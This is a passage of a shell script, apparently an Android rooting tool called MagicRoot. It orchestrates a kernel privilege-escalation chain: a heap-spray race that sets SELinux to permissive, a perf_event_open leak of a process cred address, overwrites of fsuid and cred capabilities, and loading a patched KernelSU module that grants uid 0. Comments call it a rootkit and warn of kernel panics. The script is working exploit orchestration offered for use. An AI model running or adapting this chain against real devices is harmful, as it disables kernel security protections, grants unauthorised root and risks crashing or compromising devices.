            echo "KO_PATCH_SELF_CHECK=skipped reason=ko_cache"
        fi
    fi
    prune_ko_cache
    echo "KO_CACHE_KEEP=$KO_CACHE_MAX AGE_DAYS=$KO_CACHE_DAYS dir=$KO_CACHE_DIR (retention only; not a flavor selector)"
    return 0
}

if [ "$MODULE_ALREADY_LIVE_ENFORCING" = "1" ]; then
    echo "KO_PATCH_SKIPPED reason=module_already_live"
else
    mark PATCH_PRE
    patch_ko || exit 3
    mark PATCH_DONE
    # Verify the patched module exists and is non-empty, then keep a copy at
    # /data/local/tmp/ksu-official.ko (late-load fallback path) and in the
    # work dir.
    if [ ! -s "$D/ksu-patched.ko" ]; then
        echo "FAIL=ko_patch_empty"
        exit 3
    fi
    cp -f "$D/ksu-patched.ko" /data/local/tmp/ksu-official.ko 2>/dev/null || true
    cp -f "$D/ksu-patched.ko" "$D/ksu-loaded.ko" 2>/dev/null || true
    echo "PATCHED_KO=size=$(wc -c < "$D/ksu-patched.ko" 2>/dev/null) loaded_copy=/data/local/tmp/ksu-official.ko"
fi

# Kill any leftover grab/forker spray processes and let the kernel settle
# briefly before the dangerous permissive race (fresh-boot runs used to panic
# while these were still winding down).
pkill -9 -f '[f]orker' 2>/dev/null
pkill -9 -f '[g]rab\.sh' 2>/dev/null
pkill -9 -f '[t]race_pipe_raw' 2>/dev/null
sleep 1
echo "PERMISSIVE_CLEANUP=done"
echo "== 3. SELinux permissive =="
echo "boot_id=$BOOT_ID time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)" > "$MARK/PERMISSIVE_STARTED"
mark PERMISSIVE_PRE
shot_meta permissive
if [ "$(getenforce)" != "Permissive" ]; then
    # 32 victims, matching phase1/phase2. The binaries were rebuilt with
    # MAXVICTIM=32; the old 24 clamp no longer applies.
    _perm_attempts=$ATTEMPTS_PERMISSIVE
    [ "$_perm_attempts" -gt "$PERMISSIVE_MAX_ATTEMPTS" ] 2>/dev/null &&
        _perm_attempts=$PERMISSIVE_MAX_ATTEMPTS
    echo "PERMISSIVE_LIMIT attempts=$_perm_attempts timeout=${PERMISSIVE_TIMEOUT}s"
    PERM_RC=0
    if command -v timeout >/dev/null 2>&1; then
        timeout -s KILL "$PERMISSIVE_TIMEOUT" "$V36_BIN" \
            0 "$SELINUX_ARG" "$_perm_attempts" 400 "$VICTIMS_PERMISSIVE" \
            "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE" || PERM_RC=$?
    else
        "$V36_BIN" 0 "$SELINUX_ARG" "$_perm_attempts" 400 "$VICTIMS_PERMISSIVE" \
            "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE" || PERM_RC=$?
    fi
    echo "PERMISSIVE_RC=$PERM_RC attempts=$_perm_attempts timeout=${PERMISSIVE_TIMEOUT}s"
fi
if [ "$(getenforce)" != "Permissive" ]; then
    echo "FAIL=permissive attempts=${_perm_attempts:-$ATTEMPTS_PERMISSIVE} rc=${PERM_RC:-?}"
    case "${PERM_RC:-}" in
        124|137) echo "PERMISSIVE_TIMEOUT=${PERMISSIVE_TIMEOUT}s" ;;
    esac
    echo "HINT=if this repeats, reboot and rerun; check KASLR_CROSS_CHECK and KASLR_ANCHORS>=5"
    exit 4
fi
mark PERMISSIVE_DONE
rm -f "$MARK/PERMISSIVE_STARTED" 2>/dev/null || true
# Device A/B test hook: stop right after the permissive stage so presets can be
# compared without loading a module or touching creds.
if [ "${MAGICROOT_PERMISSIVE_ONLY:-0}" = "1" ]; then
    echo "PERMISSIVE_ONLY_OK tuning=$TUNING"
    exit 0
fi

# The module was already live at entry. Now that SELinux is Permissive,
# ksu_grant's root_stage can write /data/adb; no need to reload the module.
if [ "$MODULE_ALREADY_LIVE_ENFORCING" = "1" ]; then
    echo "== 3b. reuse live module after permissive =="
    : > "$D/ksu_grant.log"
    if "$KSU_GRANT" > "$D/ksu_grant.log" 2>&1; then
        cat "$D/ksu_grant.log"
        KSU_GRANT_FD=$(sed -n 's/.*fd=\([-0-9][0-9]*\).*/\1/p' "$D/ksu_grant.log" | tail -1)
        echo "KSU_GRANT_METHOD=reboot_syscall_reuse_after_permissive fd=${KSU_GRANT_FD:-?}"
        cat "$MARK/ROOT_ID" 2>/dev/null
        echo "MODULE_REUSED_AFTER_PERMISSIVE"
        echo "DONE"
        exit 0
    fi
    cat "$D/ksu_grant.log" 2>/dev/null
    echo "REUSE_AFTER_PERMISSIVE_FAILED fallback=full_chain"
    patch_ko || exit 3
fi

echo "== 4. cred target =="
TP=$(cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id 2>/dev/null)
[ -n "$TP" ] || { echo "FAIL=missing_kmem_cache_alloc_tracepoint"; exit 5; }
CRED=""
CRED_BIT16=""
CRED_PID=""
SYNC="$MARK/sync.futex"
CRED_TRY=0
# rootkit v1.0.17: same-boot retries share a polluted heap and raise panic
# risk. Default to one retry; three-plus attempts should be a fresh boot.
CRED_TRY_MAX=${MAGICROOT_CRED_TRIES:-2}
case "$CRED_TRY_MAX" in ''|*[!0-9]*) CRED_TRY_MAX=2 ;; esac
[ "$CRED_TRY_MAX" -ge 1 ] 2>/dev/null || CRED_TRY_MAX=1
[ "$CRED_TRY_MAX" -le 4 ] 2>/dev/null || CRED_TRY_MAX=2
echo "CRED_RETRY_LIMIT=$CRED_TRY_MAX"
# bit16=0 means cap_effective=cred+0x40 lacks CAP_SYS_MODULE. A fresh
# cred_target is created only within the bounded same-boot retry budget.
while [ "$CRED_TRY" -lt "$CRED_TRY_MAX" ]; do
    CRED_TRY=$((CRED_TRY + 1))
    rm -f "$MARK/PHASE2_DONE" "$MARK/CAPBND_OK" "$MARK/FINTI_TRY" "$MARK/FINTI_RC" "$MARK/FINTI_SKIP" "$D/cred.log" "$SYNC"
    MAGICROOT_ALLOW_SHELL="$LOAD_ALLOW_SHELL" "$CRED_TARGET" "$PREPARE" "$TP" "$MARK/PHASE2_DONE" "$D/ksu-patched.ko" > "$D/cred.log" 2>&1 &
    CRED_PID=$!
    # Single futex wait; no inotify fallback and no per-round shell parsing.
    CRED_LINE=$("$WAIT_HELPER" futex-cred "$SYNC" 45000 "$CRED_PID" 2>/dev/null || true)
    CRED=""
    CRED_BIT16=""
    if [ -n "$CRED_LINE" ]; then
        rest=${CRED_LINE#*CRED=0x}
        CRED=0x${rest%% *}
        bit=${CRED_LINE#*bit16=}
        CRED_BIT16=${bit%% *}
    fi
    cat "$D/cred.log"
    if [ -n "$CRED" ] && [ "$CRED_BIT16" = "1" ]; then
        echo "CRED_OK try=$CRED_TRY bit16=1"
        break
    fi
    echo "CRED_RETRY try=$CRED_TRY bit16=${CRED_BIT16:-none} cred=${CRED:-none}"
    kill "$CRED_PID" 2>/dev/null || true
    wait "$CRED_PID" 2>/dev/null || true
    CRED=""
done
if [ -z "$CRED" ]; then
    echo "FAIL=cred_target"
    grep -m1 '^CRED=NONE' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=perf_event_open' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=mmap' "$D/cred.log" 2>/dev/null || true
    echo "HINT=perf leak (kmem_cache_alloc tracepoint) failed; check tracefs/perf_event_paranoid and SELinux state"
    echo "HINT_CRED=do not keep retrying on the same boot; full reboot and rerun (rootkit v1.0.17)"
    exit 5
fi
LEAK_LINE=$(grep -m1 '^CRED=0x' "$D/cred.log" 2>/dev/null)
if [ -n "$LEAK_LINE" ]; then
    echo "CRED_LEAK_SELF_CHECK=$LEAK_LINE"
    echo "CRED_LEAK_METHOD=perf_event_open_kmem_cache_alloc+capset"
fi
if [ "$CRED_BIT16" != "1" ]; then
    echo "FAIL=cred_bit16"
    exit 5
fi
TARGET_PID=$CRED_PID

echo "== 5. fsuid/fsgid =="
if [ "$SKIP_FSUID" = "1" ]; then
    echo "SKIP_FSUID=1"
else
    FSUID=$("$ADDRCALC" add "$CRED" 0x20)
    shot_meta fsuid
    run_v36 0 "$FSUID" "$ATTEMPTS_FSUID" 400 "$VICTIMS_FSUID" "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE"
    echo "fsuid step done (CapBnd 由 helper 在 phase1 后写入 CAPBND_OK)"
fi
# Device A/B hook: stop after the fsuid stage so fsuid parameters can be
# compared without running cred/module.
if [ "${MAGICROOT_AB_STAGE:-}" = "fsuid" ]; then
    kill -9 "$CRED_PID" 2>/dev/null || true
    rm -f "$SYNC" 2>/dev/null || true
    echo "AB_STAGE_OK stage=fsuid"
    exit 0
fi

echo "== 6. phase1+phase2 =="
# Victim count is shared by phase1/phase2; attempts/frag/drain depend on preset.
    shot_meta phase1
    run_cred "$CRED" "$ATTEMPTS_CRED1" "$ATTEMPTS_CRED2" 400 \
    "$VICTIMS_CRED" "$FRAG_CRED" \
    "$DRAIN_CRED1" "$MIN_CRED1" \
    "$DRAIN_CRED1" "$MIN_CRED1" "$DRAIN_CRED2" "$MIN_CRED2"
CRED_PHASE_RC=$?
if [ "$CRED_PHASE_RC" != "0" ]; then
    echo "FAIL=cred_phase rc=$CRED_PHASE_RC"
    kill "$TARGET_PID" 2>/dev/null || true
    exit 6
fi
# One helper waits for the MODULE futex event and then Live; shell wakes once.
MOD_WAIT_MS=${MAGICROOT_MODULE_WAIT_MS:-60000}
case "$MOD_WAIT_MS" in ''|*[!0-9]*) MOD_WAIT_MS=60000 ;; esac
[ "$MOD_WAIT_MS" -ge 5000 ] 2>/dev/null && [ "$MOD_WAIT_MS" -le 180000 ] 2>/dev/null || MOD_WAIT_MS=60000
echo "MODULE_WAIT_LIMIT_MS=$MOD_WAIT_MS"
MOD_LINE=$("$WAIT_HELPER" futex-live "$SYNC" "$MOD_WAIT_MS" 8000 "$TARGET_PID" 2>/dev/null || true)
case "$MOD_LINE" in
    LIVE) echo "MODULE_LOADED flavor=$KSU_FLAVOR" ;;
    SKIP) echo "FAIL=module_skip flavor=$KSU_FLAVOR"; exit 7 ;;
    *)
        # Bounded polling fallback for the module-live gate.
        echo "MODULE_WAIT_HELPER_TIMEOUT flavor=$KSU_FLAVOR"
        MOD_WAIT_POLL=30
        MOD_POLL_OK=0
        _i=0
        while [ "$_i" -lt "$MOD_WAIT_POLL" ]; do
            if grep -Eq '^kernelsu .* Live' /proc/modules 2>/dev/null; then
                MOD_POLL_OK=1
                echo "MODULE_LOADED_POLL after=${_i}s"
                break
            fi
            # If the loader already reported a terminal result, stop early.
            [ -f "$MARK/FINTI_RC" ] && break
            sleep 2
            _i=$((_i + 2))
            [ $((_i % 30)) -eq 0 ] && echo "  MODULE_WAIT_POLL ${_i}s"
        done
        if [ "$MOD_POLL_OK" != "1" ]; then
            echo "FAIL=module_wait flavor=$KSU_FLAVOR"
            [ -f "$MARK/FINTI_RC" ] && cat "$MARK/FINTI_RC" 2>/dev/null
            [ -f "$MARK/FINTI_SKIP" ] && cat "$MARK/FINTI_SKIP" 2>/dev/null
            echo "HINT=check ko_patch.log / dmesg; BakaSU LKM vermagic was rewritten to $(uname -r)"
            echo "HINT_ENOENT=symbol rebase mismatch; HINT_EINVAL=vermagic/payload mismatch; HINT_EPERM=module signature/SELinux"
            echo "DMESG_TAIL=$(dmesg 2>/dev/null | grep -i -E 'kernelsu|module|vermagic|Key was rejected' | tail -6 | tr '\n' '|')"
            exit 7
        fi
        ;;
esac
[ -f "$MARK/FINTI_RC" ] && cat "$MARK/FINTI_RC"
[ -f "$MARK/FINTI_SKIP" ] && cat "$MARK/FINTI_SKIP"
# Keep a copy at the late-load location and in the work dir.
if [ -f "$D/ksu-patched.ko" ]; then
    cp -f "$D/ksu-patched.ko" /data/local/tmp/ksu-official.ko 2>/dev/null || true
    cp -f "$D/ksu-patched.ko" "$D/ksu-loaded.ko" 2>/dev/null || true
    echo "PATCHED_KO_COPY=ok size=$(wc -c < "$D/ksu-patched.ko" 2>/dev/null)"
fi
if [ "$SKIP_FSUID" = "1" ]; then
    if [ -f "$MARK/FINTI_RC" ] && grep -q 'rc=0' "$MARK/FINTI_RC" &&
       grep -Eq '^kernelsu .* Live' /proc/modules; then
        echo "SKIP_FSUID_FINTI_OK"
    else
        echo "FAIL=skip_fsuid_finit"
        exit 7
    fi
fi
# Device A/B hook: stop as soon as the module is Live; avoids the
# manager/root_stage variability while still testing perm/fsuid/cred/module.
if [ "${MAGICROOT_AB_STAGE:-}" = "module" ]; then
    echo "AB_STAGE_OK stage=module"
    exit 0
fi

echo "== 7. KernelSU userspace =="
echo "KSU_BACKEND=$KSU_MANAGER_LABEL flavor=$KSU_FLAVOR manager=$KSU_MANAGER_PKG userspace=$KSUD"
MAGICROOT_KSU_FLAVOR="$KSU_FLAVOR" MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG" \
    MAGICROOT_KSUD="$KSUD" MAGICROOT_KSU_APK="$KSU_MANAGER_APK" \
    MAGICROOT_EXPECT_KVER="$EXPECT_KVER" MAGICROOT_EXPECT_UAPI="$EXPECT_UAPI" \
    MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" MAGICROOT_ALLOW_SHELL_LOADED="$LOAD_ALLOW_SHELL" \
    MAGICROOT_BOOTSTRAP_SHELL="$BOOTSTRAP_SHELL" \
    MAGICROOT_ADB_ROOT="$ADB_ROOT" MAGICROOT_SU_ENTRY="$SU_ENTRY" \
    "$KSU_GRANT" > "$D/ksu_grant.log" 2>&1
GRANT_RC=$?
cat "$D/ksu_grant.log" 2>/dev/null
KSU_GRANT_FD=$(sed -n 's/.*fd=\([-0-9][0-9]*\).*/\1/p' "$D/ksu_grant.log" | tail -1)
echo "KSU_GRANT_METHOD=reboot_syscall_chain rc=$GRANT_RC fd=${KSU_GRANT_FD:-?}"
# The grant-root ioctl is gated by the LKM's allowed_for_su checker; right
# after finit_module it can transiently fail while the allowlist/manager state
# settles, so retry up to 3 times (2s/4s backoff).
GRANT_TRY=1
while [ "$GRANT_RC" != "0" ] && [ "$GRANT_TRY" -lt 3 ]; do
    sleep $((GRANT_TRY * 2))
    GRANT_TRY=$((GRANT_TRY + 1))
    echo "GRANT_RETRY try=$GRANT_TRY rc=$GRANT_RC"
    MAGICROOT_KSU_FLAVOR="$KSU_FLAVOR" MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG" \
        MAGICROOT_KSUD="$KSUD" MAGICROOT_KSU_APK="$KSU_MANAGER_APK" \
        MAGICROOT_EXPECT_KVER="$EXPECT_KVER" MAGICROOT_EXPECT_UAPI="$EXPECT_UAPI" \
        MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" MAGICROOT_ALLOW_SHELL_LOADED="$LOAD_ALLOW_SHELL" \
        MAGICROOT_ADB_ROOT="$ADB_ROOT" MAGICROOT_SU_ENTRY="$SU_ENTRY" \
        "$KSU_GRANT" > "$D/ksu_grant.log" 2>&1
    GRANT_RC=$?
    cat "$D/ksu_grant.log" 2>/dev/null
    KSU_GRANT_FD=$(sed -n 's/.*fd=\([-0-9][0-9]*\).*/\1/p' "$D/ksu_grant.log" | tail -1)
    echo "KSU_GRANT_METHOD=reboot_syscall_chain_retry try=$GRANT_TRY rc=$GRANT_RC fd=${KSU_GRANT_FD:-?}"
    echo "GRANT_RETRY_RESULT try=$GRANT_TRY rc=$GRANT_RC"
done
cat "$MARK/ROOT_ID" 2>/dev/null
if [ "$GRANT_RC" != "0" ]; then
    echo "FAIL=ksu_grant rc=$GRANT_RC flavor=$KSU_FLAVOR"
    echo "HINT=grant-root ioctl denied (EPERM): the LKM allowed_for_su checker needs a manager, an allowlisted uid or allow_shell=1"
    echo "HINT_FIX=allow_shell is off and the shell is not allowlisted; enable 「allow shell」 (or set MAGICROOT_BOOTSTRAP_ALLOW_SHELL=1), then reboot and rerun"
    echo "HINT_ALLOWLIST=restore /data/adb/ksu/.allowlist from the saved backup and reboot; the module reads it at load time"
    exit 8
fi
if [ ! -f "$MARK/ROOT_ID" ] || ! grep -q 'uid=0' "$MARK/ROOT_ID" 2>/dev/null; then
    echo "FAIL=root_stage_not_root flavor=$KSU_FLAVOR"
    exit 8
fi

# Optional user-supplied KO for the 64560 chain.  Same checks as the 98260
# path: ELF/arch/source vermagic -> ko_patch -> target vermagic -> load.
if [ -n "${MAGICROOT_CUSTOM_KO:-}" ]; then
    CUSTOM_KO=$MAGICROOT_CUSTOM_KO
    CUSTOM_LOG=$D/64560-custom-ko.log
    CUSTOM_PATCHED=$D/64560-custom-patched.ko
    : > "$CUSTOM_LOG" 2>/dev/null || true
    TARGET_KERNEL=$(uname -r 2>/dev/null || echo unknown)
    if [ -f "$CUSTOM_KO" ]; then
        MAGIC=$(od -An -tx1 -N4 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        EM=$(od -An -tx1 -j18 -N2 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        VM=$(grep -a -o 'vermagic=[^ ]*' "$CUSTOM_KO" 2>/dev/null | head -1)
        echo "CUSTOM_KO_VERMAGIC=${VM:-unknown} elf=$MAGIC arch=$EM target=$TARGET_KERNEL" | tee -a "$CUSTOM_LOG"
        if [ "$MAGIC" != "7f454c46" ]; then
            echo "CUSTOM_KO=failed reason=not_elf path=$CUSTOM_KO"
        elif [ -n "$EM" ] && [ "$EM" != "b700" ]; then
            echo "CUSTOM_KO=failed reason=not_aarch64 arch=$EM"
        elif [ -n "$VM" ] && ! printf '%s' "$VM" | grep -q '6\.12'; then
            echo "CUSTOM_KO=failed reason=vermagic_mismatch expected=6.12 actual=$VM"
        elif [ -z "${SLIDE:-}" ] || [ -z "${SYMS:-}" ] || [ ! -f "$SYMS" ] || [ ! -x "$KOPATCH_BIN" ]; then
            echo "CUSTOM_KO=failed reason=patch_inputs_missing slide=${SLIDE:-} syms=${SYMS:-}"
        else
            "$KOPATCH_BIN" "$CUSTOM_KO" "$CUSTOM_PATCHED" "$SYMS" "$SLIDE" "$TARGET_KERNEL" >> "$CUSTOM_LOG" 2>&1
            PATCH_RC=$?
            PATCH_LINE=$(grep -m1 '^PATCHED=' "$CUSTOM_LOG" 2>/dev/null)
            CUSTOM_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
            echo "CUSTOM_KO_PATCH=rc=$PATCH_RC missing=${CUSTOM_MISSING:-none} line=$PATCH_LINE" | tee -a "$CUSTOM_LOG"
            if [ "$PATCH_RC" != "0" ] || [ "${CUSTOM_MISSING:-1}" != "0" ] || [ ! -f "$CUSTOM_PATCHED" ]; then
                echo "CUSTOM_KO=failed reason=ko_patch log=$CUSTOM_LOG"
            elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$TARGET_KERNEL SMP"; then
                echo "CUSTOM_KO=failed reason=vermagic_target_mismatch expected=$TARGET_KERNEL line=$PATCH_LINE"
            else
                echo "CUSTOM_KO_VERMAGIC_MATCH=ok target=$TARGET_KERNEL" | tee -a "$CUSTOM_LOG"
                SU_BIN=$(command -v su 2>/dev/null || true)
                if [ -z "$SU_BIN" ]; then
                    ln -sf "${KSUD:-/data/adb/ksud}" "$D/su" 2>/dev/null || true
                    SU_BIN=$D/su
                fi
                printf 'insmod "%s" >/dev/null 2>&1; echo CUSTOM_KO_RC=$?\n' "$CUSTOM_PATCHED" \
                    | "$SU_BIN" > "$CUSTOM_LOG" 2>&1
                if grep -q 'CUSTOM_KO_RC=0' "$CUSTOM_LOG" 2>/dev/null; then
                    echo "CUSTOM_KO=loaded path=$CUSTOM_PATCHED source=$CUSTOM_KO"
                else
                    echo "CUSTOM_KO=failed reason=insmod log=$CUSTOM_LOG"
                fi
            fi
        fi
    else
        echo "CUSTOM_KO=missing path=$CUSTOM_KO"
    fi
fi

# Upstream-style KSU userspace setup after root grant (best effort).  The
# 64560 reference installs ksud and relaunches the manager; on this port the
# userspace su may be absent, so never make it fatal.
if [ -x "${KSUD:-/nonexistent}" ]; then
    KSU_INSTALL_LOG=$D/ksud-install.log
    : > "$KSU_INSTALL_LOG" 2>/dev/null || true
    if command -v su >/dev/null 2>&1; then
        timeout ${MAGICROOT_KSUD_INSTALL_TIMEOUT:-120} su -c "$KSUD install" >> "$KSU_INSTALL_LOG" 2>&1
        KSU_INSTALL_RC=$?
    else
        KSU_INSTALL_RC=skip_no_su
    fi
    echo "KSUD_INSTALL_RC=$KSU_INSTALL_RC"
    if [ "$KSU_INSTALL_RC" = "0" ]; then
        am force-stop "$KSU_MANAGER_PKG" >/dev/null 2>&1 || true
        monkey -p "$KSU_MANAGER_PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
        echo "KSU_MANAGER_REFRESHED=1 package=$KSU_MANAGER_PKG"
    fi
fi

grep -i kernelsu /proc/modules 2>/dev/null
susfs_load
if [ "${MAGICROOT_STP_COMPAT:-0}" = "1" ]; then
    rm -f "$D/su" 2>/dev/null || true
    if grep -q " $D/product_bin /product/bin " /proc/mounts 2>/dev/null; then
        umount /product/bin 2>/dev/null || true
    fi
    rm -rf "$D/product_bin" 2>/dev/null || true
    echo "SU_SURFACE_CLEAN=ok reason=stp_compat"
fi
if [ -e /system/bin/su ] || [ -L /system/bin/su ]; then
    echo "SYSTEM_SU=present"
else
    echo "SYSTEM_SU=absent"
fi
if [ "${MAGICROOT_STP_COMPAT:-0}" = "1" ]; then
    stp_clear_fix
fi
cleanup_stale_98260_rootd
echo "DONE"

if [ "$AB_EXPORT" = "1" ]; then
    AB_DIR=/sdcard/Download/MagicRoot-ab
    mkdir -p "$AB_DIR" 2>/dev/null || true
    cp -f "$D/run.log" "$AB_DIR/run-$(date +%s)-$$.log" 2>/dev/null || true
fi

exit 0


























